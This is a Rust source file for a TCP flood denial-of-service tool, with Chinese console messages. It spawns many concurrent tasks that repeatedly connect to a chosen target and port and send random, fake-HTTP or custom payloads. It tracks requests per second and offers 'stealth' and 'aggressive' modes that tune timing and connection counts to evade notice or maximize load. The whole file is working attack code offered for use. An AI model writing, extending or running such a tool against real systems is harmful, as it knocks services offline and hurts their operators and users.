use crate::stats::{Stats, StatsArc};
use indicatif::{ProgressBar, ProgressStyle};
use std::net::TcpStream;
use std::io::Write;
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::time::sleep;
use rand::Rng;

pub struct TcpFloodConfig {
    pub target: String,
    pub port: u16,
    pub connections: usize,
    pub duration: u64,
    pub packet_size: usize,
    pub mode: String,
    pub payload_type: String, // random, http, custom
    pub custom_payload: Option<String>,
}

pub async fn run_tcp_flood(config: TcpFloodConfig) {
    println!("🌊 TCP洪水攻击启动");
    println!("目标: {}:{}", config.target, config.port);
    println!("攻击模式: {}", config.mode);
    println!("并发连接: {}", config.connections);
    println!("持续时间: {}秒", config.duration);
    println!("数据包大小: {} 字节", config.packet_size);
    println!("负载类型: {}", config.payload_type);
    println!();

    let stats = StatsArc::default();
    let (min_delay, max_delay) = get_tcp_delay_by_mode(&config.mode);
    let adjusted_connections = adjust_tcp_connections_by_mode(config.connections, &config.mode);

    let progress_bar = ProgressBar::new(config.duration);
    progress_bar.set_style(
        ProgressStyle::default_bar()
            .template("{spinner:.green} [{elapsed_precise}] [{bar:40.cyan/blue}] {pos}/{len} ({eta})")
            .unwrap()
            .progress_chars("#>-"),
    );

    let start_time = Instant::now();
    let stats_clone = stats.clone();
    let mut tasks = Vec::new();

    for _ in 0..adjusted_connections {
        let stats_clone = stats_clone.clone();
        let target = config.target.clone();
        let port = config.port;
        let packet_size = config.packet_size;
        let mode = config.mode.clone();
        let payload_type = config.payload_type.clone();
        let custom_payload = config.custom_payload.clone();

        let task = tokio::spawn(async move {
            loop {
                let request_start = Instant::now();

                match TcpStream::connect(format!("{}:{}", target, port)) {
                    Ok(mut stream) => {
                        // 设置socket选项
                        stream.set_nodelay(true).ok();
                        // 注意：set_keepalive在某些平台上可能不可用
                        #[cfg(unix)]
                        {
                            // 在较新的Rust版本中，set_keepalive方法已被移除，我们跳过这个设置
                            // stream.set_keepalive(Some(Duration::from_secs(30))).ok();
                        }

                        // 生成负载数据
                        let payload = generate_tcp_payload(&payload_type, packet_size, &custom_payload);
                        
                        match stream.write_all(&payload) {
                            Ok(_) => {
                                let success = true;
                                {
                                    let mut stats = stats_clone.lock().unwrap();
                                    stats.add_request(success, payload.len() as u64, 0);
                                }
                            }
                            Err(e) => {
                                {
                                    let mut stats = stats_clone.lock().unwrap();
                                    stats.add_request(false, packet_size as u64, 0);
                                }
                                eprintln!("TCP写入错误: {}", e);
                            }
                        }
                    }
                    Err(e) => {
                        {
                            let mut stats = stats_clone.lock().unwrap();
                            stats.add_request(false, packet_size as u64, 0);
                        }
                        eprintln!("TCP连接错误: {}", e);
                    }
                }

                // 根据模式调整延迟
                let elapsed = request_start.elapsed();
                if elapsed < Duration::from_millis(5) {
                    let random_delay = rand::thread_rng().gen_range(min_delay..max_delay);
                    sleep(Duration::from_millis(random_delay)).await;
                }
            }
        });
        tasks.push(task);
    }

    // 实时统计监控任务
    let stats_monitor = stats.clone();
    let monitor_task = tokio::spawn(async move {
        let mut last_stats = crate::stats::Stats::default();
        let mut last_time = Instant::now();

        loop {
            sleep(Duration::from_secs(1)).await;
            let current_stats = stats_monitor.lock().unwrap();
            let current_time = Instant::now();
            let time_diff = current_time.duration_since(last_time).as_secs_f64();
            let requests_diff = current_stats.total_requests - last_stats.total_requests;
            let rps = requests_diff as f64 / time_diff;

            println!("\r📊 TCP RPS: {:.0} | 成功: {} | 失败: {} | 总计: {}", 
                rps, 
                current_stats.successful_requests, 
                current_stats.failed_requests, 
                current_stats.total_requests
            );

            last_stats = current_stats.clone();
            last_time = current_time;
        }
    });

    // 监控进度
    let progress_task = tokio::spawn(async move {
        let mut elapsed = 0u64;
        while elapsed < config.duration {
            sleep(Duration::from_secs(1)).await;
            elapsed += 1;
            progress_bar.inc(1);
        }
        progress_bar.finish_with_message("TCP攻击完成！");
    });

    // 等待攻击完成
    tokio::select! {
        _ = progress_task => {
            println!("\n✅ TCP攻击完成！");
        }
    }

    // 取消所有正在运行的任务
    for task in tasks {
        task.abort();
    }
    monitor_task.abort();

    // 显示最终统计信息
    let final_stats = stats.lock().unwrap();
    let elapsed = start_time.elapsed();
    let total_rps = final_stats.total_requests as f64 / elapsed.as_secs_f64();

    println!("\n📊 TCP攻击最终统计:");
    println!("总运行时间: {:.2}秒", elapsed.as_secs_f64());
    println!("目标: {}:{}", config.target, config.port);
    println!("并发连接数: {}", adjusted_connections);
    println!("总数据包: {}", final_stats.total_requests);
    println!("成功发送: {}", final_stats.successful_requests);
    println!("发送失败: {}", final_stats.failed_requests);
    println!("平均RPS: {:.0}", total_rps);
    println!("发送字节: {} MB", final_stats.bytes_sent / 1024 / 1024);
    println!("成功率: {:.1}%", 
        (final_stats.successful_requests as f64 / final_stats.total_requests as f64) * 100.0
    );
}

// 生成TCP负载数据
fn generate_tcp_payload(payload_type: &str, size: usize, custom_payload: &Option<String>) -> Vec<u8> {
    match payload_type.to_lowercase().as_str() {
        "http" => generate_http_payload(size),
        "custom" => {
            if let Some(ref payload) = custom_payload {
                let mut data = payload.as_bytes().to_vec();
                while data.len() < size {
                    data.extend_from_slice(payload.as_bytes());
                }
                data.truncate(size);
                data
            } else {
                generate_random_payload(size)
            }
        }
        _ => generate_random_payload(size),
    }
}

// 生成HTTP负载
fn generate_http_payload(size: usize) -> Vec<u8> {
    let http_headers = [
        "GET / HTTP/1.1\r\n",
        "Host: target\r\n",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
        "Accept-Language: en-US,en;q=0.5\r\n",
        "Accept-Encoding: gzip, deflate\r\n",
        "Connection: keep-alive\r\n",
        "Upgrade-Insecure-Requests: 1\r\n",
        "\r\n"
    ];
    
    let mut payload = Vec::new();
    for header in &http_headers {
        payload.extend_from_slice(header.as_bytes());
    }
    
    // 填充到指定大小
    while payload.len() < size {
        payload.extend_from_slice(b"X-Padding: ");
        payload.extend_from_slice(&generate_random_bytes(size.min(100)));
        payload.extend_from_slice(b"\r\n");
    }
    
    payload.truncate(size);
    payload
}

// 生成随机负载
fn generate_random_payload(size: usize) -> Vec<u8> {
    let mut payload = Vec::with_capacity(size);
    let mut rng = rand::thread_rng();
    
    for _ in 0..size {
        payload.push(rng.gen());
    }
    
    payload
}

// 生成随机字节
fn generate_random_bytes(size: usize) -> Vec<u8> {
    let mut bytes = Vec::with_capacity(size);
    let mut rng = rand::thread_rng();
    
    for _ in 0..size {
        bytes.push(rng.gen_range(32..127)); // 可打印ASCII字符
    }
    
    bytes
}

// 根据TCP攻击模式调整延迟
fn get_tcp_delay_by_mode(mode: &str) -> (u64, u64) {
    match mode.to_lowercase().as_str() {
        "stealth" => (20, 100),     // 隐蔽模式：20-100ms
        "normal" => (5, 25),         // 正常模式：5-25ms
        "aggressive" => (1, 5),      // 激进模式：1-5ms
        _ => (5, 25),
    }
}

// 根据TCP攻击模式调整并发数
fn adjust_tcp_connections_by_mode(base_connections: usize, mode: &str) -> usize {
    match mode.to_lowercase().as_str() {
        "stealth" => (base_connections as f64 * 0.4) as usize,  // 减少60%
        "normal" => base_connections,
        "aggressive" => (base_connections as f64 * 4.0) as usize, // 增加300%
        _ => base_connections,
    }
} 